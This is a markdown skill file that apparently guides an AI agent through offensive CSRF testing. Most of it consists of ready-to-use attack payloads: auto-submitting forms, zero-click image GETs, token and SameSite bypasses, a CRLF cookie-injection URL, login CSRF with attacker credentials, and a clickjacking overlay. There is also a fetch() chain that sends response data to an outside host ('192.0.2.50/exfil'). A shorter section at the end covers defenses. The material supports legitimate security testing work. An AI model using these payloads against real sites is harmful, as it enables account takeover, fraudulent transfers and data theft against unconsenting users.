---
name: offensive-csrf
description: "Cross-Site Request Forgery (CSRF) testing skill for offensive security assessments and bug bounty hunting. Covers classic state-changing CSRF over GET and POST, CSRF-token weaknesses (missing, not-validated, predictable, reusable, not-tied-to-session, validated-only-when-present, double-submit cookie flaws), SameSite cookie bypasses (Lax-by-default gaps, top-level GET state changes, sibling/sister-site attacks, HTTP method override, newly-issued cookie window), JSON/CORS CSRF (text/plain content-type, simple requests, misconfigured credentialed CORS), Referer/Origin validation bypasses, login and logout CSRF, CSRF in multi-step flows, and clickjacking-assisted CSRF. Includes weaponized auto-submitting HTML form PoCs, fetch()/XHR PoCs, Burp Suite CSRF PoC generator usage, and defender-side guidance (synchronizer token pattern, SameSite, double-submit done right, custom-header + CORS). Use when testing anti-CSRF defenses, forging state-changing requests, assessing session-riding, or evaluating cookie and CORS configuration on web applications and APIs."
---

# Cross-Site Request Forgery — Offensive Testing Methodology

CSRF abuses the browser's habit of automatically attaching ambient credentials (cookies, HTTP Basic auth, client certs, Windows integrated auth) to any request bound for an origin — even when that request was initiated by a completely unrelated attacker-controlled page. If a state-changing endpoint relies only on those ambient credentials to authorize an action, an attacker who can get a victim to load a page can forge that action in the victim's session. The modern bar is higher than it was a decade ago: `SameSite=Lax` is now the default in Chromium and Firefox, which kills most naive cross-site POST CSRF. But defaults are not defenses — Lax has documented gaps, tokens are implemented wrong constantly, and JSON/CORS endpoints routinely re-open the hole. This skill is about finding the request that changes state, proving the server will accept it cross-site, and weaponizing it into a single click (or zero clicks).

## Quick Workflow

1. Enumerate every state-changing action (POST/PUT/PATCH/DELETE, and any GET that mutates): account email/password change, fund transfer, role grant, add-to-cart/checkout, API key creation, OAuth connect, logout, login.
2. Capture a known-good authenticated request in Burp. Note: HTTP method, `Content-Type`, every anti-CSRF token, custom headers, and which cookies carry the session.
3. Attack the token: remove it, blank it, swap it for another user's, reuse an old one, change the method, downgrade the content-type. Replay each and watch whether the action still succeeds.
4. Attack the cookie layer: test `SameSite` behavior, top-level navigation GETs, method-override params, sibling subdomains, and the newly-issued-cookie window.
5. Attack validation-by-header: strip/forge `Origin` and `Referer`; probe null-origin and suffix/substring matching bugs.
6. Build the lowest-interaction PoC that works (auto-submitting form > fetch() > GET image tag), host it, and confirm the state change in the victim account.
7. Assess impact and chain (login CSRF → session fixation, logout CSRF → forced re-auth phishing, CSRF → stored XSS → full ATO) and document remediation.

---

## Finding the State-Changing Request

Before any PoC, you need the exact request. Capture it authenticated and strip it to the minimum the server still accepts.

```http
POST /account/email HTTP/1.1
Host: example.com
Cookie: session=eyJ1aWQiOjEyM30
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

email=victim%40example.com&csrf=Kp3f...9xQ
```

Minimization checklist — remove one thing at a time and replay:

- Drop the `csrf` parameter entirely. Still 200/302 and changed? Missing validation.
- Blank the token (`csrf=`). Server may only check presence, not value.
- Change `POST` to `GET` with params in the query string. Many frameworks route both.
- Change `Content-Type` to `text/plain`. If accepted, you get a simple request (no preflight).
- Delete `Referer` / `Origin`. If the server still accepts, header validation is absent or fail-open.

---

## Classic State-Changing CSRF (GET)

State changes behind GET are the easiest CSRF — no form, no script, just an auto-loading resource. `SameSite=Lax` does NOT protect top-level GET navigations, and image/script tags that trigger a GET are a classic vector when the cookie is `SameSite=None` or unset in a legacy context.

```html
<!-- Zero-interaction: fires on page load as a sub-resource GET -->
<img src="https://example.com/account/delete?confirm=yes" width="0" height="0" alt="">
```

```html
<!-- Top-level GET navigation — carries Lax cookies because it is a full navigation -->
<a id="x" href="https://example.com/transfer?to=attacker&amount=5000">Click for prize</a>
<script>document.getElementById('x').click();</script>
```

```html
<!-- Auto top-level navigation via meta refresh (sends Lax cookies) -->
<meta http-equiv="refresh" content="0; url=https://example.com/account/promote?role=admin">
```

Any endpoint that performs a mutation on a safe method (GET/HEAD) is a finding on its own — it violates the HTTP contract and is trivially CSRFable.

---

## Classic State-Changing CSRF (POST) — Auto-Submitting Form

The workhorse PoC. A hidden form that submits itself on load. Because it is a real form submission (a top-level or navigational POST only if you target `_top`; otherwise it's a cross-site POST), it carries cookies that are `SameSite=None` or unset-in-legacy, and defeats servers that only check the HTTP method.

```html
<!DOCTYPE html>
<html>
  <body onload="document.forms[0].submit()">
    <form action="https://example.com/account/email" method="POST">
      <input type="hidden" name="email" value="attacker@example.com">
      <!-- If the token is missing/not-validated, no csrf field is needed -->
    </form>
  </body>
</html>
```

Multi-value and array parameters translate directly to hidden inputs:

```html
<form action="https://example.com/api/roles" method="POST">
  <input type="hidden" name="user" value="123">
  <input type="hidden" name="roles[]" value="admin">
  <input type="hidden" name="roles[]" value="billing">
</form>
```

For endpoints that insist on `multipart/form-data` (file-ish forms), set the enctype so the browser builds a real multipart body:

```html
<form action="https://example.com/api/upload-avatar" method="POST"
      enctype="multipart/form-data">
  <input type="hidden" name="url" value="https://192.0.2.10/evil.png">
</form>
```

---

## CSRF-Token Weaknesses

Most real CSRF findings today are token-implementation bugs, not the total absence of a token. Test each of these systematically.

### Token not validated at all

The field exists in the form but the server never checks it. Submit without it:

```http
POST /account/email HTTP/1.1
Host: example.com
Cookie: session=...
Content-Type: application/x-www-form-urlencoded

email=attacker@example.com
```

If it succeeds with no `csrf` parameter, the token is decorative.

### Token validated only when present

The server validates a token if the parameter is sent, but skips validation when it is absent. This is extremely common. Delete the parameter name entirely (not just its value):

```http
# This is rejected (wrong value):
email=attacker@example.com&csrf=wrong

# This is ACCEPTED (parameter omitted → validation skipped):
email=attacker@example.com
```

### Token not tied to the session

If the token is validated against a global pool rather than the victim's session, your own valid token works in the victim's request. Grab a token from your authenticated session and hardcode it into the PoC:

```html
<form action="https://example.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
  <!-- Attacker's own valid token, accepted because it isn't bound to the victim -->
  <input type="hidden" name="csrf" value="ATTACKER_VALID_TOKEN">
</form>
```

### Token tied to a non-session cookie

Some apps bind the CSRF token to a `csrfKey` cookie that is separate from the session cookie. If you can set that cookie in the victim's browser (via a cookie-injection bug, a response-header injection, or a sibling subdomain), you can pair your own token with your own `csrfKey` and have both ride along. Combine with a cookie-setting gadget:

```html
<!-- Step 1: set attacker's csrfKey via a header-injection / cookie-setting endpoint -->
<img src="https://example.com/search?q=x%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY%3b%20SameSite=None"
     onerror="document.forms[0].submit()">
<!-- Step 2: submit with matching attacker token -->
<form action="https://example.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="hidden" name="csrf" value="ATTACKER_TOKEN_FOR_KEY">
</form>
```

### Predictable or reusable tokens

- **Reusable:** capture one valid token and replay it across many victims/sessions. If it never expires and isn't single-use, it's a static secret.
- **Predictable:** short tokens, timestamps, sequential counters, MD5(username), or base64 of guessable data. Decode and model them.

```bash
# Decode a suspicious token to spot structure (timestamp, uid, hash)
echo 'MTcyMzQ1Njc4OToxMjM=' | base64 -d        # -> 1723456789:123  (epoch:uid)
```

### Double-submit cookie flaws

Double-submit compares a cookie value to a request parameter and trusts them if equal. It breaks when the attacker can influence the cookie:

- **Attacker-chosen cookie:** if any endpoint reflects user input into a `Set-Cookie`, or a sibling subdomain can write the parent-domain cookie, set `csrf=KNOWN` as a cookie and send `csrf=KNOWN` as the parameter — they match, validation passes.
- **Naive equality:** some implementations accept any non-empty match, so `csrf=1` cookie + `csrf=1` param passes.

```html
<!-- Plant the double-submit cookie from a subdomain / injection, then submit the match -->
<script>document.cookie = "csrf=attackerpicked; domain=example.com; path=/; SameSite=None; Secure";</script>
<form action="https://example.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
  <input type="hidden" name="csrf" value="attackerpicked">
</form>
<script>document.forms[0].submit();</script>
```

---

## SameSite Cookie Bypasses

`SameSite` is the browser-level mitigation, but it has well-documented edges. Confirm the actual attribute in the `Set-Cookie` response; "Lax by default" only applies when the site did not set it explicitly, and it has special windows.

| Scenario | SameSite behavior | CSRF implication |
|---|---|---|
| `SameSite=None; Secure` | Sent on all cross-site requests | Full classic CSRF (GET+POST) |
| Unset (Lax default) | Sent on top-level GET navigations only | GET-based + method confusion viable |
| `SameSite=Lax` (explicit) | Same as default | GET navigation + Lax-allowing endpoints |
| `SameSite=Strict` | Never sent cross-site | Need on-site gadget (XSS, open redirect, sibling site) |

### Top-level GET state change (Lax gap)

Lax permits cookies on top-level GET navigations. If any state change is reachable via GET, navigate the whole window to it:

```html
<script>window.location = "https://example.com/transfer?to=attacker&amount=5000";</script>
```

### HTTP method override (Lax gap)

Frameworks that honor `_method`, `X-HTTP-Method-Override`, or `?_method=POST` let you express a POST as a Lax-friendly top-level GET, or convert a form POST into the "real" verb server-side.

```html
<!-- Rails/Laravel-style override: browser does a Lax-carrying form POST,
     server treats it as PUT/DELETE -->
<form action="https://example.com/account/email" method="POST">
  <input type="hidden" name="_method" value="PUT">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
```

```http
# Some stacks accept the override on a GET query string:
GET /account/delete?_method=DELETE HTTP/1.1
Host: example.com
Cookie: session=...
```

### Newly-issued cookie window (Lax+POST 2-minute grace)

Chromium's "Lax+POST" mitigation makes an unset cookie temporarily behave like `None` for top-level cross-site POSTs for roughly the first 2 minutes after the cookie is issued. If you can force the victim to get a fresh cookie (e.g., trigger a login/refresh in one tab) and then immediately fire a cross-site POST, the just-issued cookie rides along.

```html
<!-- Open the page that reissues the session cookie, wait briefly, then POST -->
<iframe src="https://example.com/refresh-session" style="display:none"></iframe>
<script>
  setTimeout(() => document.forms[0].submit(), 1500); // within the ~120s window
</script>
<form action="https://example.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="5000">
</form>
```

### Sibling / sister-site attacks

`SameSite` is about the *site* (eTLD+1), not the origin. `a.example.com` and `b.example.com` are the same site. A CSRF (or XSS) on any subdomain, or on a less-protected sibling, sends cookies to the whole site. If you control or compromise `promo.example.com`, you can launch "same-site" requests against `app.example.com` that even `SameSite=Strict` will allow.

```html
<!-- Hosted on a compromised/sibling origin promo.example.com:
     Strict cookies for app.example.com are still sent (same site) -->
<form action="https://app.example.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>document.forms[0].submit();</script>
```

---

## JSON / CORS CSRF

APIs that expect `application/json` are often assumed CSRF-safe because a cross-site `fetch` with a JSON content-type triggers a CORS preflight that the attacker can't satisfy. That assumption fails in several ways.

### text/plain content-type (no preflight)

`text/plain`, `application/x-www-form-urlencoded`, and `multipart/form-data` are "simple request" content-types that do NOT trigger a preflight. If the server parses the body as JSON regardless of the declared content-type, you win.

```html
<!-- Form submits a JSON body under a simple content-type: no preflight -->
<form action="https://example.com/api/account" method="POST"
      enctype="text/plain">
  <!-- Produces body: {"email":"attacker@example.com","x":"}  (name=value pair) -->
  <input name='{"email":"attacker@example.com","x":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

```javascript
// fetch with text/plain stays a "simple" request — no preflight, cookies sent
fetch("https://example.com/api/account", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "text/plain" },
  body: JSON.stringify({ email: "attacker@example.com" })
});
```

### Flawed CORS allowing credentialed writes

If the API reflects the request `Origin` into `Access-Control-Allow-Origin` AND sets `Access-Control-Allow-Credentials: true`, an attacker page can make fully credentialed cross-origin writes (and read responses). This is CORS misconfiguration enabling CSRF with confirmation.

```bash
# Probe: does the server reflect arbitrary origins with credentials?
curl -s -I https://example.com/api/account \
  -H "Origin: https://attacker.example" | \
  grep -i 'access-control-allow-'
# Dangerous if you see:
#   Access-Control-Allow-Origin: https://attacker.example
#   Access-Control-Allow-Credentials: true
```

```javascript
// Weaponized credentialed cross-origin write against reflected-origin CORS
fetch("https://example.com/api/account", {
  method: "POST",
  credentials: "include",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ email: "attacker@example.com" })
})
  .then(r => r.text())
  .then(d => navigator.sendBeacon("https://192.0.2.50/exfil", d));
```

Also test `null` origin acceptance (sandboxed iframe) and whether `Access-Control-Allow-Origin: *` is paired with credentials (browsers reject that combo, but some servers additionally reflect specific origins).

```html
<!-- null-origin probe: sandboxed iframe sends Origin: null -->
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <script>
    fetch('https://example.com/api/account',{method:'POST',credentials:'include',
      headers:{'Content-Type':'application/json'},
      body:'{\"email\":\"attacker@example.com\"}'});
  <\/script>">
</iframe>
```

---

## Referer / Origin Validation Bypasses

When a server validates `Origin`/`Referer` instead of (or alongside) a token, attack the matcher.

### Missing header fail-open

Many validators only check the header *if present*. Suppress it and the check is skipped.

```html
<!-- referrerpolicy strips Referer on the forged request -->
<form action="https://example.com/account/email" method="POST"
      referrerpolicy="no-referrer">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
```

```html
<!-- Document-level policy removes Referer for all sub-requests -->
<meta name="referrer" content="no-referrer">
```

### Substring / suffix / prefix matching bugs

| Validator logic | Bypass domain | Why it passes |
|---|---|---|
| `referer.contains("example.com")` | `https://example.com.attacker.example` | substring present |
| `referer.contains("example.com")` | `https://attacker.example/?example.com` | substring in query |
| `referer.startsWith("https://example.com")` | `https://example.com.attacker.example` | prefix match |
| `referer.endsWith("example.com")` | `https://notexample.com` | suffix match |

```html
<!-- Host the PoC where the Referer satisfies a naive matcher -->
<!-- e.g. served from https://example.com.attacker.example/poc.html -->
<form action="https://example.com/account/email" method="POST">
  <input type="hidden" name="email" value="attacker@example.com">
</form>
<script>history.pushState('', '', '/?example.com'); document.forms[0].submit();</script>
```

For Origin checks, remember the attacker cannot forge `Origin` from a browser, so the practical bypasses are: (1) make the header absent, (2) exploit a matcher that accepts a crafted attacker domain, or (3) abuse a same-site sibling origin.

---

## Login and Logout CSRF

### Login CSRF (session fixation via forced login)

Force the victim's browser to log in to an *attacker-controlled* account. The victim then unknowingly operates in the attacker's session — anything they enter (payment methods, searches, uploaded files) lands in the attacker's account, which the attacker later logs back into.

```html
<!-- Logs the victim into the attacker's account -->
<form action="https://example.com/login" method="POST">
  <input type="hidden" name="username" value="attacker@example.com">
  <input type="hidden" name="password" value="AttackerPassw0rd!">
</form>
<script>document.forms[0].submit();</script>
```

Impact escalates when the victim subsequently links a credit card or connects an OAuth identity to what is actually the attacker's account.

### Logout CSRF

Forcibly logging a victim out is low-severity alone, but it enables phishing (victim is bounced to a login page you can style/redirect) and can break security workflows.

```html
<img src="https://example.com/logout" width="0" height="0" alt="">
```

---

## CSRF in Multi-Step Flows

Multi-step actions (confirm email → set new value, or wizard step 1 → step 2 → commit) can still be CSRFable if intermediate tokens are predictable or if steps can be replayed/skipped. Chain auto-submitting forms with timed submission, or pre-fetch a step-1 token server-side if it's not session-bound.

```html
<!-- Two-stage CSRF: submit step 1, then step 2 after a short delay -->
<iframe name="s1" style="display:none"></iframe>
<iframe name="s2" style="display:none"></iframe>

<form target="s1" action="https://example.com/wizard/step1" method="POST" id="f1">
  <input type="hidden" name="newEmail" value="attacker@example.com">
</form>
<form target="s2" action="https://example.com/wizard/commit" method="POST" id="f2">
  <input type="hidden" name="confirm" value="yes">
</form>

<script>
  document.getElementById('f1').submit();
  setTimeout(() => document.getElementById('f2').submit(), 2000);
</script>
```

If step 2 requires a token minted in step 1, test whether that token is tied to the session (replayable) or leaked in a redirect/Referer you can read.

---

## Clickjacking-Assisted CSRF

When an action requires a genuine user gesture (and tokens are properly bound so a blind PoC fails), overlay the real, authenticated page in a transparent iframe and trick the victim into clicking the actual button. The click happens inside the victim's own session, so valid tokens are present — you're only supplying the gesture and the coordinates.

```html
<!DOCTYPE html>
<html>
  <head>
    <style>
      iframe {
        position: absolute; top: 0; left: 0;
        width: 1000px; height: 800px;
        opacity: 0.0001;              /* invisible but clickable */
        z-index: 2;
      }
      #lure {
        position: absolute; top: 420px; left: 360px; /* align to real button */
        z-index: 1; font-size: 28px;
      }
    </style>
  </head>
  <body>
    <div id="lure">Click here to claim your prize</div>
    <iframe src="https://example.com/account/delete-confirm"></iframe>
  </body>
</html>
```

This only works if the target page lacks framebusting — i.e., no `X-Frame-Options: DENY/SAMEORIGIN` and no `Content-Security-Policy: frame-ancestors`. Confirm those headers are missing before investing in alignment.

---

## Burp Suite CSRF PoC Generator

Burp automates the HTML PoC for any captured request, including multipart and odd content-types.

```
1. Proxy ▸ HTTP history — find the state-changing request
2. Right-click the request ▸ Engagement tools ▸ Generate CSRF PoC
3. In the CSRF PoC generator:
   - Tick "Include auto-submit script" for zero-click delivery
   - Use "Options" to force method/content-type if the request used JSON
   - Edit hidden fields to set attacker-controlled values
4. "Copy HTML" or "Test in browser" to validate against a live session
5. Host the HTML on your redirector (e.g., http://192.0.2.20/poc.html) and
   trigger it in an authenticated victim session to confirm the state change
```

Notes:

- For JSON endpoints, Burp can emit a `text/plain` form PoC; verify the server still parses the body.
- Burp Scanner (Pro) flags "CSRF" and "SameSite" issues passively — treat them as leads, then manually prove exploitability by replaying without the token.
- "Test in browser" uses your current Burp-proxied browser session — make sure you're logged in as the victim test account, not the attacker.

---

## Detection / Defender View

What the defense looks like from the other side, and what you'll observe when it's done right (so you know when to stop).

### Synchronizer token pattern (the gold standard)

A per-session (ideally per-request) unpredictable token, stored server-side, embedded in every state-changing form, and validated on every mutation. Correctly implemented, the blind PoC simply fails: no token, no action.

```html
<form action="/account/email" method="POST">
  <input type="hidden" name="csrf" value="{{ session.csrf_token }}">
  <input type="text" name="email">
</form>
```

- Token MUST be bound to the session, unpredictable (CSPRNG), and rejected when absent.
- Validation must fail-closed: missing token → reject, not skip.

### SameSite cookies, correctly

```http
Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax; Path=/
```

- `Strict` for pure-session cookies where cross-site top-level entry isn't needed.
- `Lax` as a baseline; never rely on it as the *only* control (remember the GET, method-override, and newly-issued-cookie gaps above).
- Never `SameSite=None` without a token backing it up.

### Double-submit, done right

Signed/HMAC'd double-submit so the attacker can't forge a matching pair, and the cookie host-locked with the `__Host-` prefix so a sibling subdomain can't overwrite it.

```http
Set-Cookie: __Host-csrf=<hmac(session_id)>; Secure; Path=/; SameSite=Lax
```

The request must echo a value the server can re-derive/verify against the session, not a bare equality check.

### Custom header + CORS

For JSON APIs, require a custom header (e.g., `X-CSRF-Token` or even a static `X-Requested-With`) that cannot be set cross-site without a CORS preflight the attacker can't satisfy, and keep CORS strict.

```js
// Server: reject state-changing requests lacking the custom header
app.use((req, res, next) => {
  const unsafe = !["GET", "HEAD", "OPTIONS"].includes(req.method);
  if (unsafe && req.get("X-CSRF-Token") !== req.session.csrf) {
    return res.status(403).end();
  }
  next();
});
```

```http
# CORS must NOT reflect arbitrary origins when credentials are allowed:
Access-Control-Allow-Origin: https://app.example.com   # explicit, never reflected '*'
Access-Control-Allow-Credentials: true
```

### What defenders see in logs

- Bursts of identical POSTs with missing/blank tokens → probing.
- `Origin`/`Referer` cross-site on state-changing endpoints with `403` → working controls.
- `Sec-Fetch-Site: cross-site` on mutations is a strong server-side signal to block.

```js
// Fetch-metadata defense (modern, header-based):
app.use((req, res, next) => {
  const site = req.get("Sec-Fetch-Site");
  if (!["GET", "HEAD"].includes(req.method) && site === "cross-site") {
    return res.status(403).end();
  }
  next();
});
```

---

## Engagement Cheatsheet

```text
1. CAPTURE   Authenticated state-changing request in Burp (method, CT, token, cookies).
2. TOKEN     Remove token / blank token / swap for own token / reuse old / change method
             / downgrade content-type to text/plain. Replay each; note any 200/302 + change.
3. COOKIE    Check Set-Cookie SameSite. Try: top-level GET nav, _method override,
             sibling-subdomain host, newly-issued-cookie (<120s) window.
4. HEADER    Strip Referer (referrerpolicy=no-referrer); test substring/suffix matcher;
             try null-origin sandboxed iframe for CORS.
5. CORS/JSON curl -I with spoofed Origin → look for reflected ACAO + ACAC:true.
             fetch() text/plain or credentialed JSON write; exfil response via beacon.
6. POC       Burp ▸ Generate CSRF PoC (auto-submit). Prefer form > fetch > <img> GET.
7. PROVE     Fire in victim session; confirm state changed. Screenshot before/after.
8. CHAIN     Login CSRF→fixation; logout CSRF→phishing; CSRF→stored XSS→ATO; clickjack
             when a real gesture + bound token is required.
```

Minimal zero-click POST PoC to keep handy:

```html
<body onload="document.forms[0].submit()">
  <form action="https://example.com/ACTION" method="POST">
    <input type="hidden" name="PARAM" value="VALUE">
  </form>
</body>
```

---

## Key References

- OWASP Cross-Site Request Forgery Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- OWASP Clickjacking Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html
- OWASP WSTG — Testing for CSRF (WSTG-SESS-05): https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery
- PortSwigger Web Security Academy — CSRF: https://portswigger.net/web-security/csrf
- PortSwigger — Bypassing SameSite cookie restrictions: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions
- PortSwigger — CSRF tokens: https://portswigger.net/web-security/csrf/tokens
- CWE-352: Cross-Site Request Forgery (CSRF): https://cwe.mitre.org/data/definitions/352.html
- CWE-1275: Sensitive Cookie with Improper SameSite Attribute: https://cwe.mitre.org/data/definitions/1275.html
- CWE-942: Permissive Cross-domain Policy with Untrusted Domains (CORS): https://cwe.mitre.org/data/definitions/942.html
- MDN — SameSite cookies: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite
- MDN — Fetch metadata request headers (Sec-Fetch-Site): https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Site
- IETF RFC 6265bis — Cookies, SameSite and `__Host-` prefix: https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis
- MITRE ATT&CK: T1185 (Browser Session Hijacking)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/csrf.md
